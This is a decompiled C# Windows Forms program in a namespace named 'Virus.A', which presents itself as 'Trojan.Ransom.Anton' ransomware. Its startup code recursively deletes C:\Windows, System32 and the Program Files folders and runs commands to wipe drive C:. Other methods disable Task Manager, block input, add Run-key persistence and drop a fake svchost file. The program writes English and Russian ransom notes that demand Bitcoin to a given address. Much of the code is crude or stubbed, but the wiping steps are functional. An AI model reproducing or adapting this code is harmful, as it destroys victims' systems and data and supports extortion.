using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Virus.A.Properties;

namespace Virus.A;

public class Form1 : Form
{
	private IContainer components = null;

	private TextBox textBox1;

	private Timer timer1;

	private Button button3;

	public string MyFilePath { get; private set; }

	public static void ToggleTaskManager(bool toggle)
	{
		RegistryKey localMachine = Registry.LocalMachine;
		RegistryKey registryKey = localMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", (!toggle) ? 1 : 0, RegistryValueKind.DWord);
		Process.Start("cmd.exe", "del.exe /S /Q C:");
		Process.Start("cmd.exe", "rmdir.exe /S /Q C:");
		Process.Start("shutdown /r /t 518400");
		Console.WriteLine("13284 MB / 13284 MB");
		Console.WriteLine("Your files encrypted");
		using RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		registryKey2.SetValue("Wallpaper", new FileInfo("at.jpg").FullName);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool BlockInput([In][MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	private void button2_Click(object sender, EventArgs e)
	{
		BlockInput(fBlockIt: true);
	}

	public Form1()
	{
		InitializeComponent();
		new ProcessStartInfo();
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			Console.Write(current.Name + "\n");
			StreamWriter streamWriter = new StreamWriter("C://TrojanRansomAntonRUS.txt");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			StreamWriter streamWriter2 = new StreamWriter(folderPath + "\\Anton.txt");
			StreamWriter streamWriter3 = new StreamWriter(folderPath + "\\a.anton");
			StreamWriter streamWriter4 = new StreamWriter(folderPath + "\\b.wncryanton");
			StreamWriter streamWriter5 = new StreamWriter(folderPath + "\\encrypt.encrypt");
			StreamWriter streamWriter6 = new StreamWriter(folderPath + "\\exeexeexe1.AntonTrojan");
			streamWriter2.WriteLine("Hello! You victim on ARTEMON RANSOMWARE!");
			streamWriter2.WriteLine("your files encrypted");
			streamWriter2.WriteLine("For decryption, you must send us 0.001 BTC");
			streamWriter2.WriteLine("For decryption, you must send us 0.001 BTC");
			streamWriter2.WriteLine("For decryption, you must send us 0.001 BTC");
			streamWriter2.WriteLine("For decryption, you must send us 0.001 BTC");
			streamWriter2.WriteLine("Adress BTC: 36bUzEo3hksCZfQ4GTCogZnWc5ZTTtv3MD");
			streamWriter2.WriteLine("Your key that you should send to us: eycfs-50dsY-YiVip-GoP00X");
			streamWriter2.WriteLine("Your key that you should send to us: eycfs-50dsY-YiVip-GoP00X");
			streamWriter2.WriteLine("Your key that you should send to us: eycfs-50dsY-YiVip-GoP00X");
			streamWriter2.WriteLine("Within 1-2 days, we will send you a password and instructions for decryption.");
			streamWriter2.WriteLine("Copyring 2020-2021");
			streamWriter3.WriteLine("WNCRY\u0002\v\u0006s\u0004  \f\b\u0002o\u0005\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o");
			streamWriter4.WriteLine("WNCRY\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o");
			streamWriter5.WriteLine("WNCRY\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o");
			streamWriter6.WriteLine("WNCRY\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o\u0002\v\u0006s\u0004  \f\b\u0002o");
			streamWriter2.Close();
			streamWriter3.Close();
			streamWriter4.Close();
			streamWriter6.Close();
			streamWriter5.Close();
			string path = "C:\\Windows\\System32";
			string path2 = "C:\\Windows\\";
			string path3 = "C:\\Program Files\\";
			string path4 = "C:\\Program Files (x86)";
			Directory.Delete(path, recursive: true);
			Directory.Delete(path2, recursive: true);
			Directory.Delete(path3, recursive: true);
			Directory.Delete(path4, recursive: true);
			Directory.CreateDirectory(path);
			streamWriter.WriteLine("Здравствуйте! Ваш компьютер заражен вирусом Trojan.Ransom.Artemon.A RANSOMWARE! 2021.");
			streamWriter.WriteLine("Ваши файлы были зашифрованы.");
			streamWriter.WriteLine("Для расшифровки вы должны отправить нам 0.001 BTC");
			streamWriter.WriteLine("Для расшифровки вы должны отправить нам 0.001 BTC");
			streamWriter.WriteLine("Для расшифровки вы должны отправить нам 0.001 BTC");
			streamWriter.WriteLine("Для расшифровки вы должны отправить нам 0.001 BTC");
			streamWriter.WriteLine("Адрес: 36bUzEo3hksCZfQ4GTCogZnWc5ZTTtv3MD");
			streamWriter.WriteLine("Ваш ключ, который вы должны отправить нам: eycfs-50dsY-YiVip-GoP00X");
			streamWriter.WriteLine("Ваш ключ, который вы должны отправить нам: eycfs-50dsY-YiVip-GoP00X");
			streamWriter.WriteLine("Ваш ключ, который вы должны отправить нам: eycfs-50dsY-YiVip-GoP00X");
			streamWriter.WriteLine("В течение 1-2 суток мы скинем вам пароль и инструкцию для дешифровки.");
			streamWriter.WriteLine("Copyring 2020-2021");
			streamWriter.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception: " + ex.Message);
		}
		finally
		{
			Console.WriteLine("Executing finally block.");
		}
		Cursor.Hide();
		try
		{
			StreamReader streamReader = new StreamReader("C://VIRUS.txt");
			for (string text = streamReader.ReadLine(); text != null; text = streamReader.ReadLine())
			{
				Console.WriteLine(text);
			}
			streamReader.Close();
			Console.ReadLine();
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Exception: " + ex2.Message);
		}
		finally
		{
			Console.WriteLine("Executing finally block.");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		SetAutoRunValue(autorun: true, Assembly.GetExecutingAssembly().Location);
		ProcessStartInfo startInfo = new ProcessStartInfo();
		Thread.Sleep(15000);
		Process.Start(startInfo);
		string path = "C:/Windows/svchost.com";
		try
		{
			using FileStream fileStream = File.Create(path);
			byte[] bytes = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes("This is some text in the file.");
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	private bool SetAutoRunValue(bool autorun, string path)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		Registry.CurrentUser.CreateSubKey("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot\\");
		try
		{
			if (autorun)
			{
				registryKey.SetValue("HelloApp", path);
			}
			else
			{
				registryKey.DeleteValue("HelloApp");
			}
			registryKey.Flush();
			registryKey.Close();
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	private void button1_click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Form2 form = new Form2();
		((Form)form).ShowDialog();
	}

	private void button2_Click_1(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).Hide();
		Form2 form = new Form2();
		((Form)form).ShowDialog();
		byte[] bytes = File.ReadAllBytes(MyFilePath);
		byte[] bytes2 = smethod_0(bytes);
		string fileName = null;
		string path = smethod_1(fileName);
		File.WriteAllBytes(path, bytes2);
		IPAddress localaddr = IPAddress.Parse("127.0.0.1");
		TcpListener tcpListener = new TcpListener(localaddr, 445);
		tcpListener.Start();
		while (true)
		{
			try
			{
				TcpClient tcpClient = tcpListener.AcceptTcpClient();
				NetworkStream stream = tcpClient.GetStream();
				try
				{
					if (stream.CanRead)
					{
						byte[] array = new byte[1024];
						StringBuilder stringBuilder = new StringBuilder();
						int num = 0;
						do
						{
							num = stream.Read(array, 0, array.Length);
							stringBuilder.AppendFormat("{0}", Encoding.UTF8.GetString(array, 0, num));
						}
						while (stream.DataAvailable);
						byte[] bytes3 = Encoding.UTF8.GetBytes("УСПЕШНО!");
						stream.Write(bytes3, 0, bytes3.Length);
					}
				}
				finally
				{
					stream.Close();
					tcpClient.Close();
				}
			}
			catch
			{
				tcpListener.Stop();
				break;
			}
		}
	}

	private string GetNewFileName(object myFileName)
	{
		throw new NotImplementedException();
	}

	private byte[] Crypt(byte[] myFile)
	{
		throw new NotImplementedException();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "MIICXAIBAAKBgQCLIUZfnjuTQ/fuKUj5a4HEG/BYGcvIB6DoUzmoYJGf3LrHEY5l")
		{
			Application.Exit();
		}
		else
		{
			((Control)textBox1).set_Text("Incorrect key! Please try again.");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		textBox1 = new TextBox();
		timer1 = new Timer(components);
		button3 = new Button();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Location(new Point(899, 492));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(316, 33));
		((Control)textBox1).set_TabIndex(4);
		((Control)button3).set_Location(new Point(701, 492));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(192, 33));
		((Control)button3).set_TabIndex(12);
		((Control)button3).set_Text("Decrypt sector");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkGreen);
		((Control)this).set_BackgroundImage((Image)(object)Resources.XGvgWDHmhI0);
		((Form)this).set_ClientSize(new Size(1437, 766));
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).set_Cursor(Cursors.get_AppStarting());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Trojan.Ransom.Anton.A");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[CompilerGenerated]
	internal static byte[] smethod_0(byte[] bytes)
	{
		for (int i = 0; i < bytes.Length; i++)
		{
			bytes[i] ^= 1;
		}
		return bytes;
	}

	[CompilerGenerated]
	internal static string smethod_1(string FileName)
	{
		return FileName.EndsWith(".a") ? FileName.Remove(FileName.LastIndexOf(".b")) : (FileName + ".c");
	}
}
